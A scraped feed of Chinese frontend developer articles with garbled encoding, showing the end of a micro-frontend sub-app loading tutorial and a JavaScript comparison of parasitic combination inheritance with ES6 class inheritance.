    isStyle || i.setAttribute('src', e)<span class="hljs-comment">;</span>
    isStyle &amp;&amp; i.setAttribute('href', e)<span class="hljs-comment">;</span>
    isStyle &amp;&amp; i.setAttribute('rel', 'stylesheet')<span class="hljs-comment">;</span>
    isStyle &amp;&amp; i.setAttribute('type', 'text/css')<span class="hljs-comment">;</span>
    function onload() {
      if (!(this.readyState &amp;&amp; this.readyState !== 'loaded' &amp;&amp; this.readyState !== 'complete')) {
        <span class="hljs-attr">i.onload</span> = null<span class="hljs-comment">;</span>
        <span class="hljs-attr">i.onreadystatechange</span> = i.<span class="hljs-literal">on</span>load<span class="hljs-comment">;</span>
        reslove()<span class="hljs-comment">;</span>
      }
    }
    function onerror(ee) {
      reject(ee)<span class="hljs-comment">;</span>
    }
    <span class="hljs-attr">i.onreadystatechange</span> = <span class="hljs-literal">on</span>load<span class="hljs-comment">;</span>
    <span class="hljs-attr">i.onload</span> = <span class="hljs-literal">on</span>load<span class="hljs-comment">;</span>
    <span class="hljs-attr">i.onerror</span> = <span class="hljs-literal">on</span>error<span class="hljs-comment">;</span>
    document.querySelector('head').appendChild(i)<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

function ERROR() {
  return 'åŠ è½½é™æ€èµ„æºå¤±è´¥ï¼Œè¯·ç¨åé‡è¯•'<span class="hljs-comment">;</span>
}

const <span class="hljs-attr">subappRoutes</span> = []<span class="hljs-comment">;</span>

const <span class="hljs-attr">AyncComponent</span> = async (pathname) =&gt; {
  const <span class="hljs-attr">id</span> = pathname<span class="hljs-comment">;</span>
  // å­å·¥ç¨‹èµ„æºæ˜¯å¦åŠ è½½å®Œæˆ
  let <span class="hljs-attr">ayncLoaded</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  if (subappRoutes<span class="hljs-section">[id]</span>) {
    // å¦‚æœå·²ç»åŠ è½½è¿‡è¯¥å­å·¥ç¨‹çš„æ¨¡å—ï¼Œåˆ™ä¸å†åŠ è½½ï¼Œç›´æ¥å–ç¼“å­˜çš„routes
    <span class="hljs-attr">ayncLoaded</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  } else if (window.ziPLATFORMSLOT &amp;&amp; window.ziPLATFORMSLOT<span class="hljs-section">[pathname]</span>) {
    const <span class="hljs-attr">res</span> = await window.ziPLATFORMSLOT[pathname]()<span class="hljs-comment">;</span>
    subappRoutes<span class="hljs-section">[id]</span> = res.default<span class="hljs-comment">;</span>
    <span class="hljs-attr">ayncLoaded</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    // return subappRoutes<span class="hljs-section">[id]</span><span class="hljs-comment">;</span>
  } else {
    try {
      await insertScript(`${configUrl<span class="hljs-section">[env]</span>}/js/index.js?<span class="hljs-attr">_</span>=<span class="hljs-variable">${new Date().getTime()}</span>`)<span class="hljs-comment">;</span>
      if (window.ziPLATFORMSLOT &amp;&amp; window.ziPLATFORMSLOT<span class="hljs-section">[pathname]</span>) {
        const <span class="hljs-attr">res</span> = await window.ziPLATFORMSLOT[pathname]()<span class="hljs-comment">;</span>
        subappRoutes<span class="hljs-section">[id]</span> = res.default<span class="hljs-comment">;</span>
        <span class="hljs-attr">ayncLoaded</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
      }
    } catch (error) {
      console.log('åŠ è½½jså¤±è´¥', error)<span class="hljs-comment">;</span>
    }
  }
  return ayncLoaded ? connect(mapStateToProps)(subappRoutes<span class="hljs-section">[id]</span>) : ERROR<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

export default <span class="hljs-section">[
  {
    name: 'èµ„æºç®¡ç†',
    path: 'ziMedia',
    component: () =&gt; AyncComponent('ziMedia'),
  },
  {
    name: 'é»‘åå•ç®¡ç†',
    path: 'ziBlack',
    component: () =&gt; AyncComponent('ziBlack'),
  },
]</span><span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-1">å­åº”ç”¨æ”¹é€ </h2>
<p>å­åº”ç”¨ä¸­ï¼Œå…¥å£æ–‡ä»¶æˆ‘ä»¬éœ€è¦å®šä¹‰publicPathä¿è¯èµ„æºçš„æ­£ç¡®å¼•ç”¨</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> configUrl = {
  <span class="hljs-attr">test</span>: <span class="hljs-string">'https://zi.test.cn'</span>,
  <span class="hljs-attr">product</span>: <span class="hljs-string">'https://zi.prod.com'</span>,
};

<span class="hljs-keyword">const</span> env = <span class="hljs-string">'product'</span>;
<span class="hljs-comment">// webpack çš„é­”æ³•å˜é‡ï¼Œç”¨äºæŒ‡å®šå¼‚æ­¥åŠ è½½çš„ JS/CSS æ–‡ä»¶çš„åŸºåœ°å€ï¼ˆå¦‚Â `import()`Â åŠ¨æ€å¯¼å…¥çš„æ¨¡å—ï¼‰</span>
__webpack_public_path__ = <span class="hljs-string">`<span class="hljs-subst">${configUrl[env]}</span>/js/`</span>;

<span class="hljs-keyword">const</span> routes = {
  <span class="hljs-attr">version</span>: <span class="hljs-string">'1.0.0'</span>,
  <span class="hljs-attr">ziMedia</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./ziMedia/index'</span>),
  <span class="hljs-attr">ziBlack</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./ziBlack/index'</span>),
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> routes;
</code></pre>
<p>åœ¨å­åº”ç”¨çš„é¡µé¢ä¸­ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸éœ€è¦åšæ”¹é€ ï¼Œä½†æ˜¯åœ¨webpackçš„é…ç½®ä¸­ï¼Œæˆ‘ä»¬åœ¨baseä¸­éœ€è¦:</p>
<pre><code class="hljs language-css" lang="css">{
    ...
    output:{
        ...
          libraryExport: <span class="hljs-string">'default'</span>,
          library: <span class="hljs-string">'ziPLATFORMSLOT'</span>,
          libraryTarget: <span class="hljs-string">'umd'</span>,
          umdNamedDefine: true,
    },
    externals: {
      'react': <span class="hljs-string">'React'</span>,
      <span class="hljs-string">'antd'</span>: <span class="hljs-string">'Antd_ZI'</span>,
      // <span class="hljs-string">'react-dom'</span>:<span class="hljs-string">'ReactDOM'</span>
    }
}
</code></pre>
<p>åœ¨prodé…ç½®ä¸­ï¼Œä¸ºäº†ä¿è¯å­jsèƒ½æ­£ç¡®åŠ è½½æ‰§è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨InlineChunkHtmlPluginæ’ä»¶ï¼Œé¿å…å¾®å‰ç«¯ç¯å¢ƒä¸‹å› è·¯å¾„é—®é¢˜å¯¼è‡´è¿è¡Œæ—¶è„šæœ¬åŠ è½½å¤±è´¥ã€‚
è‡³æ­¤ï¼Œå®Œæˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¯„ç”Ÿç»„åˆç»§æ‰¿ vs ES6 ç±»ç»§æ‰¿ æ·±åº¦å¯¹æ¯”]]></title>    <link>https://juejin.cn/post/7581658157145342002</link>    <guid>https://juejin.cn/post/7581658157145342002</guid>    <pubDate>2025-12-09T08:48:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581658157145342002" data-draft-id="7581667332306124838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¯„ç”Ÿç»„åˆç»§æ‰¿ vs ES6 ç±»ç»§æ‰¿ æ·±åº¦å¯¹æ¯”"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-09T08:48:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹‹æ’å›"/> <meta itemprop="url" content="https://juejin.cn/user/2261046026312318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¯„ç”Ÿç»„åˆç»§æ‰¿ vs ES6 ç±»ç»§æ‰¿ æ·±åº¦å¯¹æ¯”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2261046026312318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹‹æ’å›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T08:48:18.000Z" title="Tue Dec 09 2025 08:48:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-estuary-light">.hljs-comment,.hljs-quote{color:#6c6b5a}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ba6236}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#ae7313}.hljs-bullet,.hljs-string,.hljs-symbol{color:#7d9726}.hljs-section,.hljs-title{color:#36a166}.hljs-keyword,.hljs-selector-tag{color:#5f9182}.hljs-addition,.hljs-deletion{color:#22221b;display:inline-block;width:100%}.hljs-deletion{background-color:#ba6236}.hljs-addition{background-color:#7d9726}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f4f3ec;color:#5f5e4e}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼ˆParasitic Combination Inheritanceï¼‰</h2>
<h3 data-id="heading-1">å®ç°æ–¹å¼</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// çˆ¶ç±»</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span> = [<span class="hljs-string">'red'</span>, <span class="hljs-string">'blue'</span>, <span class="hljs-string">'green'</span>];
}

<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent name:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayColors</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent colors:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span>);
};

<span class="hljs-comment">// å­ç±»</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// æ„é€ å‡½æ•°ç»§æ‰¿ï¼ˆç»§æ‰¿å®ä¾‹å±æ€§ï¼‰</span>
  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-comment">// åŸå‹ç»§æ‰¿ï¼ˆç»§æ‰¿æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-params">child, parent</span>) {
  <span class="hljs-comment">// åˆ›å»ºçˆ¶ç±»åŸå‹çš„å‰¯æœ¬</span>
  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  <span class="hljs-comment">// ä¿®å¤ constructor æŒ‡å‘</span>
  prototype.<span class="hljs-property">constructor</span> = child;
  <span class="hljs-comment">// è®¾ç½®å­ç±»åŸå‹</span>
  child.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = prototype;
}

<span class="hljs-comment">// åº”ç”¨å¯„ç”Ÿç»„åˆç»§æ‰¿</span>
<span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-title class_">Child</span>, <span class="hljs-title class_">Parent</span>);

<span class="hljs-comment">// æ·»åŠ å­ç±»æ–¹æ³•</span>
<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayAge</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child age:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>);
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> child1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">10</span>);
child1.<span class="hljs-property">colors</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'black'</span>);
child1.<span class="hljs-title function_">sayName</span>();    <span class="hljs-comment">// Parent name: Alice</span>
child1.<span class="hljs-title function_">sayAge</span>();     <span class="hljs-comment">// Child age: 10</span>
child1.<span class="hljs-title function_">sayColors</span>();  <span class="hljs-comment">// Parent colors: ["red", "blue", "green", "black"]</span>

<span class="hljs-keyword">const</span> child2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">12</span>);
child2.<span class="hljs-title function_">sayColors</span>();  <span class="hljs-comment">// Parent colors: ["red", "blue", "green"]</span>
</code></pre>
<h2 data-id="heading-2">2. ES6 ç±»ç»§æ‰¿</h2>
<h3 data-id="heading-3">å®ç°æ–¹å¼</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// çˆ¶ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span> = [<span class="hljs-string">'red'</span>, <span class="hljs-string">'blue'</span>, <span class="hljs-string">'green'</span>];
  }
  
  <span class="hljs-title function_">sayName</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent name:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
  
  <span class="hljs-title function_">sayColors</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent colors:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span>);
  }
  
  <span class="hljs-comment">// é™æ€æ–¹æ³•</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'This is a static method'</span>);
  }
}

<span class="hljs-comment">// å­ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">super</span>(name);  <span class="hljs-comment">// å¿…é¡»è°ƒç”¨ super</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  
  <span class="hljs-title function_">sayAge</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child age:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>);
  }
  
  <span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-title function_">sayName</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayName</span>();  <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'And I am a child'</span>);
  }
  
  <span class="hljs-comment">// é™æ€æ–¹æ³•ä¹Ÿå¯ä»¥ç»§æ‰¿</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">childStaticMethod</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">staticMethod</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child static method'</span>);
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> child1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">10</span>);
child1.<span class="hljs-property">colors</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'black'</span>);
child1.<span class="hljs-title function_">sayName</span>();    <span class="hljs-comment">// Parent name: Alice \n And I am a child</span>
child1.<span class="hljs-title function_">sayAge</span>();     <span class="hljs-comment">// Child age: 10</span>
child1.<span class="hljs-title function_">sayColors</span>();  <span class="hljs-comment">// Parent colors: ["red", "blue", "green", "black"]</span>

<span class="hljs-title class_">Child</span>.<span class="hljs-title function_">childStaticMethod</span>();  <span class="hljs-comment">// é™æ€æ–¹æ³•è°ƒç”¨</span>
</code></pre>
<h2 data-id="heading-4">3. è¯¦ç»†å¯¹æ¯”</h2>


















































